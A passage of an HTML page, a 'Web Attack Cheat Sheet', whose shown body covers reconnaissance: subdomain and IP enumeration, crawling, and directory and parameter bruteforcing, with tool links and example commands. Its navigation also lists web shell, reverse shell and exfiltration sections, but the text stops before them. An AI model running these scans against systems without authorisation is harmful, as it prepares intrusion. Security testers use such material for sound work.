@@ -1,0 +1,1342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Web Attack Cheat Sheet - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Web Attack Cheat Sheet", url: "#_top", children: [
+              {title: "Discovering", url: "#discovering" },
+              {title: "Targets", url: "#targets" },
+              {title: "IP Enumeration", url: "#ip-enumeration" },
+              {title: "Subdomain Enumeration", url: "#subdomain-enumeration" },
+              {title: "Wayback Machine", url: "#wayback-machine" },
+              {title: "Cache", url: "#cache" },
+              {title: "Crawling", url: "#crawling" },
+              {title: "Wordlist", url: "#wordlist" },
+              {title: "Directory Bruteforcing", url: "#directory-bruteforcing" },
+              {title: "Parameter Bruteforcing", url: "#parameter-bruteforcing" },
+              {title: "DNS and HTTP detection", url: "#dns-and-http-detection" },
+              {title: "Acquisitions/Names/Addresses/Contacts/Emails/etc.", url: "#acquisitionsnamesaddressescontactsemailsetc" },
+              {title: "HTML/JavaScript Comments", url: "#htmljavascript-comments" },
+              {title: "Google Dorks", url: "#google-dorks" },
+              {title: "Content Security Policy (CSP)", url: "#content-security-policy-csp" },
+              {title: "Tiny URLs Services", url: "#tiny-urls-services" },
+              {title: "GraphQL", url: "#graphql" },
+              {title: "General", url: "#general" },
+          ]},
+          {title: "* Enumerating", url: "#enumerating", children: [
+              {title: "Fingerprint", url: "#fingerprint" },
+              {title: "Buckets", url: "#buckets" },
+              {title: "Cloud Enumeration", url: "#cloud-enumeration" },
+              {title: "Containerization", url: "#containerization" },
+              {title: "Visual Identification", url: "#visual-identification" },
+          ]},
+          {title: "* Scanning", url: "#scanning", children: [
+              {title: "Static Application Security Testing", url: "#static-application-security-testing" },
+              {title: "Dependency Confusion", url: "#dependency-confusion" },
+              {title: "Send Emails", url: "#send-emails" },
+              {title: "Search Vulnerabilities", url: "#search-vulnerabilities" },
+              {title: "Web Scanning", url: "#web-scanning" },
+              {title: "HTTP Request Smuggling", url: "#http-request-smuggling" },
+              {title: "Subdomain Takeover", url: "#subdomain-takeover" },
+              {title: "SQLi (SQL Injection)", url: "#sqli-sql-injection" },
+              {title: "XSS", url: "#xss" },
+              {title: "Repositories Scanning", url: "#repositories-scanning" },
+              {title: "Secret Scanning", url: "#secret-scanning" },
+              {title: "Google Dorks Scanning", url: "#google-dorks-scanning" },
+              {title: "CORS Misconfigurations", url: "#cors-misconfigurations" },
+          ]},
+          {title: "* Monitoring", url: "#monitoring", children: [
+              {title: "CVE", url: "#cve" },
+          ]},
+          {title: "* Attacking", url: "#attacking", children: [
+              {title: "Brute Force", url: "#brute-force" },
+              {title: "Exfiltration", url: "#exfiltration" },
+          ]},
+          {title: "* Execute on target server (replace YOURBCID)", url: "#execute-on-target-server-replace-yourbcid", children: [
+          ]},
+          {title: "* Execute on attacker machine (replace YOURBIID) and extract Burp Collaborator results", url: "#execute-on-attacker-machine-replace-yourbiid-and-extract-burp-collaborator-results", children: [
+          ]},
+          {title: "* Get IDs available", url: "#get-ids-available", children: [
+          ]},
+          {title: "* Update ID and get command result (repeat for each ID)", url: "#update-id-and-get-command-result-repeat-for-each-id", children: [
+              {title: "General", url: "#general_1" },
+          ]},
+          {title: "* Manual", url: "#manual", children: [
+              {title: "Payloads", url: "#payloads" },
+              {title: "Bypass", url: "#bypass" },
+              {title: "Deserialization", url: "#deserialization" },
+              {title: "SSRF (Server-Side Request Forgery)", url: "#ssrf-server-side-request-forgery" },
+              {title: "OAuth", url: "#oauth" },
+              {title: "DNS Rebinding", url: "#dns-rebinding" },
+              {title: "SMTP Header Injection", url: "#smtp-header-injection" },
+              {title: "Web Shell", url: "#web-shell" },
+              {title: "Reverse Shell", url: "#reverse-shell" },
+              {title: "SQLi (SQL Injection)", url: "#sqli-sql-injection_1" },
+              {title: "XSS", url: "#xss_1" },
+              {title: "XPath Injection", url: "#xpath-injection" },
+              {title: "LFI (Local File Inclusion)", url: "#lfi-local-file-inclusion" },
+              {title: "SSTI (Server Side Template Injection)", url: "#ssti-server-side-template-injection" },
+              {title: "Information Disclosure", url: "#information-disclosure" },
+              {title: "WebDAV (Web Distributed Authoring and Versioning)", url: "#webdav-web-distributed-authoring-and-versioning" },
+              {title: "Generic Tools", url: "#generic-tools" },
+          ]},
+          {title: "* AI", url: "#ai", children: [
+          ]},
+          {title: "* General", url: "#general_2", children: [
+          ]},
+          {title: "!/bin/bash", url: "#binbash", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="web-attack-cheat-sheet">Web Attack Cheat Sheet</h1>
+<h2 id="discovering">Discovering</h2>
+<h2 id="targets">Targets</h2>
+<p><code>https://github.com/arkadiyt/bounty-targets-data</code></p>
+<ul>
+<li>This repo contains data dumps of Hackerone and Bugcrowd scopes (i.e. the domains that are eligible for bug bounty reports).</li>
+</ul>
+<p>https://chaos.projectdiscovery.io</p>
+<ul>
+<li>We actively collect and maintain internet-wide assets' data, this project is meant to enhance research and analyse changes around DNS for better insights.</li>
+</ul>
+<p>https://chaos-data.projectdiscovery.io/index.json</p>
+<ul>
+<li>Project Discovery Chaos Data</li>
+</ul>
+<p>https://learn.microsoft.com/en-us/exchange/client-developer/web-service-reference/getfederationinformation-operation-soap</p>
+<ul>
+<li>The GetFederationInformation operation provides information about the federation status of the organization, such as the target URI to be used when requesting tokens that are targeted at this organization, and the other domains that the organization has also federated.</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$ curl -s -X POST -H $&#39;Content-Type: text/xml; charset=utf-8&#39; -H $&#39;SOAPAction: \&quot;http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation\&quot;&#39; -H $&#39;User-Agent: AutodiscoverClient&#39; -H $&#39;Connection: close&#39; --data-binary $&#39;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;\x0d\x0a&lt;soap:Envelope xmlns:exm=\&quot;http://schemas.microsoft.com/exchange/services/2006/messages\&quot; xmlns:ext=\&quot;http://schemas.microsoft.com/exchange/services/2006/types\&quot; xmlns:a=\&quot;http://www.w3.org/2005/08/addressing\&quot; xmlns:soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot; xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot;&gt;\x0d\x0a\x09&lt;soap:Header&gt;\x0d\x0a\x09\x09&lt;a:Action soap:mustUnderstand=\&quot;1\&quot;&gt;http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation&lt;/a:Action&gt;\x0d\x0a\x09\x09&lt;a:To soap:mustUnderstand=\&quot;1\&quot;&gt;https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc&lt;/a:To&gt;\x0d\x0a\x09\x09&lt;a:ReplyTo&gt;\x0d\x0a\x09\x09\x09&lt;a:Address&gt;http://www.w3.org/2005/08/addressing/anonymous&lt;/a:Address&gt;\x0d\x0a\x09\x09&lt;/a:ReplyTo&gt;\x0d\x0a\x09&lt;/soap:Header&gt;\x0d\x0a\x09&lt;soap:Body&gt;\x0d\x0a\x09\x09&lt;GetFederationInformationRequestMessage xmlns=\&quot;http://schemas.microsoft.com/exchange/2010/Autodiscover\&quot;&gt;\x0d\x0a\x09\x09\x09&lt;Request&gt;\x0d\x0a\x09\x09\x09\x09&lt;Domain&gt;contoso.com&lt;/Domain&gt;\x0d\x0a\x09\x09\x09&lt;/Request&gt;\x0d\x0a\x09\x09&lt;/GetFederationInformationRequestMessage&gt;\x0d\x0a\x09&lt;/soap:Body&gt;\x0d\x0a&lt;/soap:Envelope&gt;&#39; https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc | xmllint --format -
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>&lt;?xml version=&quot;1.0&quot;?&gt;
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:a=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>  &lt;s:Header&gt;
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>    &lt;a:Action s:mustUnderstand=&quot;1&quot;&gt;http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformationResponse&lt;/a:Action&gt;
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    &lt;h:ServerVersionInfo xmlns:h=&quot;http://schemas.microsoft.com/exchange/2010/Autodiscover&quot; xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>      &lt;h:MajorVersion&gt;15&lt;/h:MajorVersion&gt;
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>      &lt;h:MinorVersion&gt;20&lt;/h:MinorVersion&gt;
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>      &lt;h:MajorBuildNumber&gt;7316&lt;/h:MajorBuildNumber&gt;
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>      &lt;h:MinorBuildNumber&gt;39&lt;/h:MinorBuildNumber&gt;
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>      &lt;h:Version&gt;Exchange2015&lt;/h:Version&gt;
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    &lt;/h:ServerVersionInfo&gt;
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>  &lt;/s:Header&gt;
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>  &lt;s:Body&gt;
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    &lt;GetFederationInformationResponseMessage xmlns=&quot;http://schemas.microsoft.com/exchange/2010/Autodiscover&quot;&gt;
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>      &lt;Response xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>        &lt;ErrorCode&gt;NoError&lt;/ErrorCode&gt;
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>        &lt;ErrorMessage/&gt;
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>        &lt;ApplicationUri&gt;outlook.com&lt;/ApplicationUri&gt;
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>        &lt;Domains&gt;
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>          &lt;Domain&gt;contoso.com&lt;/Domain&gt;
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>          &lt;Domain&gt;CONTOSO18839.onmicrosoft.com&lt;/Domain&gt;
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>          &lt;Domain&gt;contoso18839.microsoftonline.com&lt;/Domain&gt;
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>        &lt;/Domains&gt;
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>        &lt;TokenIssuers&gt;
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>          &lt;TokenIssuer&gt;
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>            &lt;Endpoint&gt;https://login.microsoftonline.com/extSTS.srf&lt;/Endpoint&gt;
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>            &lt;Uri&gt;urn:federation:MicrosoftOnline&lt;/Uri&gt;
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>          &lt;/TokenIssuer&gt;
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>        &lt;/TokenIssuers&gt;
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>      &lt;/Response&gt;
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>    &lt;/GetFederationInformationResponseMessage&gt;
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>  &lt;/s:Body&gt;
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>&lt;/s:Envelope&gt;
+</span></code></pre></div>
+<h2 id="ip-enumeration">IP Enumeration</h2>
+<p>http://www.asnlookup.com</p>
+<ul>
+<li>This tool leverages ASN to look up IP addresses (IPv4 &amp; IPv6) owned by a specific organization for reconnaissance purposes.</li>
+</ul>
+<p>https://github.com/pielco11/fav-up</p>
+<ul>
+<li>Lookups for real IP starting from the favicon icon and using Shodan.</li>
+</ul>
+<p><code>python3 favUp.py --favicon-file favicon.ico -sc</code></p>
+<p>https://stackoverflow.com/questions/16986879/bash-script-to-list-all-ips-in-prefix
+ * List all IP addresses in a given CIDR block</p>
+<p><code>nmap -sL -n 10.10.64.0/27 | awk '/Nmap scan report/{print $NF}'</code></p>
+<p>https://kaeferjaeger.gay/?dir=cdn-ranges/
+ * Lists of IP ranges used by CDNs (Cloudflare, Akamai, Incapsula, Fastly, etc). Updated every 30 minutes.</p>
+<p>https://kaeferjaeger.gay/?dir=ip-ranges/
+ * Lists of IP ranges from: Google (Cloud &amp; GoogleBot), Bing (Bingbot), Amazon (AWS), Microsoft (Azure), Oracle (Cloud) and DigitalOcean. Updated every 6 hours.</p>
+<p>https://netlas.io/
+ * Internet intelligence apps that provide accurate technical information on IP addresses, domain names, websites, web applications, IoT devices, and other online assets.</p>
+<p>https://github.com/zidansec/CloudPeler
+ * This tools can help you to see the real IP behind CloudFlare protected websites.</p>
+<p>https://github.com/christophetd/CloudFlair
+ * CloudFlair is a tool to find origin servers of websites protected by CloudFlare (or CloudFront) which are publicly exposed and don't appropriately restrict network access to the relevant CDN IP ranges.</p>
+<p>https://github.com/projectdiscovery/cdncheck
+ * cdncheck is a tool for identifying the technology associated with dns / ip network addresses.</p>
+<p>https://github.com/Warflop/cloudbunny
+ * CloudBunny is a tool to capture the origin server that uses a WAF as a proxy or protection.</p>
+<h2 id="subdomain-enumeration">Subdomain Enumeration</h2>
+<p>https://web.archive.org/web/20211127183642/https://appsecco.com/books/subdomain-enumeration/
+ * This book intendes to be a reference for subdomain enumeration techniques.</p>
+<p>https://celes.in/posts/cloudflare_ns_whois
+ * Enumerating all domains from a cloudflare account by nameserver correlation.</p>
+<p>https://github.com/knownsec/ksubdomain
+ * ksubdomain是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。</p>
+<p><code>ksubdomain -d example.com</code></p>
+<p>https://github.com/OWASP/Amass
+ * The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.
+<code>amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com</code></p>
+<p>https://github.com/projectdiscovery/subfinder
+ * subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.
+<code>subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com</code></p>
+<p>https://github.com/infosec-au/altdns
+ * Altdns is a DNS recon tool that allows for the discovery of subdomains that conform to patterns. Altdns takes in words that could be present in subdomains under a domain (such as test, dev, staging) as well as takes in a list of subdomains that you know of.
+<code>altdns -i subdomains. -o data_output -w words. -r -s results_output.</code></p>
+<p>https://github.com/Josue87/gotator
+ * Gotator is a tool to generate DNS wordlists through permutations.
+<code>gotator -sub domains. -perm permutations. -depth 2 -numbers 5 &gt; output.</code></p>
+<p>https://github.com/nsonaniya2010/SubDomainizer
+ * SubDomainizer is a tool designed to find hidden subdomains and secrets present is either webpage, Github, and external javascripts present in the given URL.
+<code>python3 SubDomainizer.py -u example.com -o dir/example.com</code></p>
+<p>https://github.com/projectdiscovery/uncover
+ * uncover is a go wrapper using APIs of well known search engines to quickly discover exposed hosts on the internet.</p>
+<p>https://dns.bufferover.run/dns?q=example.com
+ * Powered by DNSGrep (https://github.com/erbbysam/DNSGrep)
+ * A utility for quickly searching presorted DNS names. Built around the Rapid7 rdns &amp; fdns dataset.</p>
+<p>https://crt.sh/?q=example.com
+ * Certificate Search</p>
+<p>https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization
+ * Censys is the most reputable, exhaustive, and up-to-date source of Internet scan data in the world, so you see everything.</p>
+<p>https://www.shodan.io/search?query=ssl%3AExample
+ * Shodan is the world's first search engine for Internet-connected devices.</p>
+<p>https://fullhunt.io/
+ * If you don't know all your internet-facing assets, which ones are vulnerable, FullHunt is here for you.</p>
+<p>https://github.com/xiecat/fofax
+ * fofax is a fofa query tool written in go, positioned as a command-line tool and characterized by simplicity and speed.
+<code>fofax -q 'app="APACHE-Solr"'</code></p>
+<p>https://publicwww.com
+ * Find any alphanumeric snippet, signature or keyword in the web pages HTML, JS and CSS code.</p>
+<p>https://fofa.so
+ * FOFA (Cyberspace Assets Retrieval System) is the world's IT equipment search engine with more complete data coverage, and it has more complete DNA information of global networked IT equipment.</p>
+<p>https://www.zoomeye.org
+ * ZoomEyeis China's first and world-renowned cyberspace search engine driven by 404 Laboratory of Knownsec. Through a large number of global surveying and mapping nodes, according to the global IPv4, IPv6 address and website domain name databases，it can continuously scan and identify multiple service port and protocols 24 hours a day, and finally map the whole or local cyberspace.</p>
+<p>https://securitytrails.com/list/email/dns-admin.example.com
+ * Total Internet Inventory with the most comprehensive data that informs with unrivaled accuracy.
+<code>curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&amp;page=1&amp;scroll=true' --data '{"filter":{"apex_domain":"example.com"}}' | jq -Mr '.records[].hostname' &gt;&gt; subdomains.</code>
+<code>curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&amp;page=1&amp;scroll=true' --data '{"filter":{"whois_email":"domains@example.com"}}' | jq -Mr '.records[].hostname' &gt;&gt; domains.</code></p>
+<p>https://viewdns.info/reversewhois
+ * This free tool will allow you to find domain names owned by an individual person or company.</p>
+<p>https://www.whoxy.com
+ * Our WHOIS API returns consistent and well-structured WHOIS data in XML &amp; JSON format. Returned data contain parsed WHOIS fields that can be easily understood by your application.</p>
+<p>https://github.com/MilindPurswani/whoxyrm
+ * A reverse whois tool based on Whoxy API based on @jhaddix's talk on Bug Hunter's Methodology v4.02.
+<code>whoxyrm -company-name "Example Inc."</code></p>
+<p>https://opendata.rapid7.com/
+ * Offering researchers and community members open access to data from Project Sonar, which conducts internet-wide surveys to gain insights into global exposure to common vulnerabilities.</p>
+<p>https://openintel.nl/
+ * The goal of the OpenINTEL measurement platform is to capture daily snapshots of the state of large parts of the global Domain Name System. Because the DNS plays a key role in almost all Internet services, recording this information allows us to track changes on the Internet, and thus its evolution, over longer periods of time. By performing active measurements, rather than passively collecting DNS data, we build consistent and reliable time series of the state of the DNS.</p>
+<p>https://github.com/ninoseki/mihari
+ * Mihari is a framework for continuous OSINT based threat hunting.</p>
+<p>https://github.com/ProjectAnte/dnsgen
+ * This tool generates a combination of domain names from the provided input. Combinations are created based on wordlist. Custom words are extracted per execution.</p>
+<p>https://github.com/resyncgg/ripgen
+ * A rust-based version of the popular dnsgen python utility.</p>
+<p>https://github.com/d3mondev/puredns
+ * Fast domain resolver and subdomain bruteforcing with accurate wildcard filtering.</p>
+<p>https://github.com/projectdiscovery/dnsx
+ * Fast and multi-purpose DNS toolkit allow to run multiple DNS queries.</p>
+<p>https://github.com/glebarez/cero
+ * Cero will connect to remote hosts, and read domain names from the certificates provided during TLS handshake.</p>
+<p>https://cramppet.github.io/regulator/index.html
+ * Regulator: A unique method of subdomain enumeration</p>
+<p>https://github.com/blechschmidt/massdns
+ * MassDNS is a simple high-performance DNS stub resolver targeting those who seek to resolve a massive amount of domain names in the order of millions or even billions.
+<code>massdns -r resolvers. -o S -w massdns.out subdomains.</code></p>
+<p>https://github.com/trickest/resolvers
+ * The most exhaustive list of reliable DNS resolvers.</p>
+<p>https://github.com/n0kovo/n0kovo_subdomains
+ * An extremely effective subdomain wordlist of 3,000,000 lines, crafted by harvesting SSL certs from the entire IPv4 space.</p>
+<h2 id="wayback-machine">Wayback Machine</h2>
+<p>https://github.com/tomnomnom/waybackurls
+ * Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for *.domain and output them on stdout.
+<code>cat subdomains. | waybackurls &gt; waybackurls.</code></p>
+<p>https://github.com/tomnomnom/hacks
+ * Hacky one-off scripts, tests etc.
+<code>cat waybackurls. | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.</code></p>
+<p>https://github.com/lc/gau
+ * getallurls (gau) fetches known URLs from AlienVault's Open Threat Exchange, the Wayback Machine, and Common Crawl for any given domain.
+<code>cat domains. | gau --threads 5</code></p>
+<h2 id="cache">Cache</h2>
+<p>https://portswigger.net/research/practical-web-cache-poisoning
+ * Web cache poisoning has long been an elusive vulnerability, a 'theoretical' threat used mostly to scare developers into obediently patching issues that nobody could actually exploit.
+ * In this paper I'll show you how to compromise websites by using esoteric web features to turn their caches into exploit delivery systems, targeting everyone that makes the mistake of visiting their homepage.</p>
+<p>https://www.giftofspeed.com/cache-checker
+ * This tool lists which web files on a website are cached and which are not. Furthermore it checks by which method these files are cached and what the expiry time of the cached files is.</p>
+<p>https://youst.in/posts/cache-poisoning-at-scale/
+ * Even though Web Cache Poisoning has been around for years, the increasing complexity in technology stacks constantly introduces unexpected behaviour which can be abused to achieve novel cache poisoning attacks. In this paper I will present the techniques I used to report over 70 cache poisoning vulnerabilities to various Bug Bounty programs.</p>
+<p>https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
+ * Web Cache Vulnerability Scanner (WCVS) is a fast and versatile CLI scanner for web cache poisoning developed by Hackmanit.
+<code>wcvs -u https://example.com -hw "file:/home/user/Documents/wordlist-header." -pw "file:/home/user/Documents/wordlist-parameter."</code></p>
+<h2 id="crawling">Crawling</h2>
+<p>https://github.com/jaeles-project/gospider
+ * Fast web spider written in Go.
+<code>gospider -s "https://example.com/" -o output -c 20 -d 10</code></p>
+<p>https://github.com/xnl-h4ck3r/xnLinkFinder
+ * This is a tool used to discover endpoints (and potential parameters) for a given target.</p>
+<p>https://github.com/hakluke/hakrawler
+ * Fast golang web crawler for gathering URLs and JavaScript file locations. This is basically a simple implementation of the awesome Gocolly library.
+<code>echo https://example.com | hakrawler</code></p>
+<p>https://github.com/projectdiscovery/katana
+ * A next-generation crawling and spidering framework.
+<code>katana -u https://example.com</code></p>
+<p>https://geotargetly.com/geo-browse
+ * Geo Browse is a tool designed to capture screenshots of your website from different countries.</p>
+<p>https://commoncrawl.org/
+ * We build and maintain an open repository of web crawl data that can be accessed and analyzed by anyone.</p>
+<p>https://github.com/bitquark/shortscan
+ * Shortscan is designed to quickly determine which files with short filenames exist on an IIS webserver. Once a short filename has been identified the tool will try to automatically identify the full filename.
+<code>shortscan https://example.com/</code></p>
+<h2 id="wordlist">Wordlist</h2>
+<p>https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
+ * Scrapes all unique words and numbers for use with password cracking.</p>
+<p>https://github.com/ameenmaali/wordlistgen
+ * wordlistgen is a tool to pass a list of URLs and get back a list of relevant words for your wordlists.
+<code>cat hosts. | wordlistgen</code></p>
+<p>https://github.com/danielmiessler/SecLists
+ * SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.</p>
+<p>https://github.com/swisskyrepo/PayloadsAllTheThings
+ * A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques.</p>
+<p>https://github.com/fuzzdb-project/fuzzdb
+ * FuzzDB was created to increase the likelihood of finding application security vulnerabilities through dynamic application security testing.</p>
+<p>https://github.com/google/fuzzing
+ * This project aims at hosting tutorials, examples, discussions, research proposals, and other resources related to fuzzing.</p>
+<p>https://wordlists.assetnote.io
+ * This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.</p>
+<p>https://github.com/trickest/wordlists
+ * Real-world infosec wordlists, updated regularly.</p>
+<p>https://github.com/the-xentropy/samlists
+ * The wordlists are created by trawling through huge public datasets. The methods employed are a bit different based on the noisiness of the data source.</p>
+<h2 id="directory-bruteforcing">Directory Bruteforcing</h2>
+<p>https://github.com/ffuf/ffuf
+ * A fast web fuzzer written in Go.
+<code>ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist. -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'</code></p>
+<p>https://github.com/iustin24/chameleon
+ * Chameleon provides better content discovery by using wappalyzer's set of technology fingerprints alongside custom wordlists tailored to each detected technologies.
+<code>chameleon --url https://example.com -a</code></p>
+<p>https://github.com/OJ/gobuster
+ * Gobuster is a tool used to brute-force.
+<code>gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist. -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'</code></p>
+<p>https://github.com/tomnomnom/meg
+ * meg is a tool for fetching lots of URLs but still being 'nice' to servers.
+<code>meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic. example. weblogic</code></p>
+<p>https://github.com/deibit/cansina
+ * Cansina is a Web Content Discovery Application.
+<code>python3 cansina.py -u 'https://example.com/' -p mydirfilelist. --persist</code></p>
+<p>https://github.com/epi052/feroxbuster
+ * A simple, fast, recursive content discovery tool written in Rust.
+<code>feroxbuster -u 'https://example.com/' -x pdf -x js,html -x php  json,docx</code></p>
+<p>https://github.com/projectdiscovery/httpx
+ * httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp library, it is designed to maintain the result reliability with increased threads.
+<code>cat hosts. | httpx</code></p>
+<p>https://github.com/assetnote/kiterunner
+ * Kiterunner is a tool that is capable of not only performing traditional content discovery at lightning fast speeds, but also bruteforcing routes/endpoints in modern applications.</p>
+<h2 id="parameter-bruteforcing">Parameter Bruteforcing</h2>
+<p>https://github.com/s0md3v/Arjun
+ * Arjun can find query parameters for URL endpoints.
+<code>arjun -u https://example.com/</code></p>
+<p>https://github.com/Sh1Yo/x8
+ * Hidden parameters discovery suite written in Rust.
+<code>x8 -u "https://example.com/" -w &lt;wordlist&gt;</code></p>
+<h2 id="dns-and-http-detection">DNS and HTTP detection</h2>
+<p>https://ceye.io
+ * Monitor service for security testing.
+<code>curl http://api.ceye.io/v1/records?token={API Key}&amp;type=dns
+curl http://api.ceye.io/v1/records?token={API Key}&amp;type=http</code></p>
+<p>https://portswigger.net/burp/documentation/collaborator
+ * Burp Collaborator is a network service that Burp Suite uses to help discover many kinds of vulnerabilities.
+ * Tip https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions</p>
+<p>https://httpbin.org/
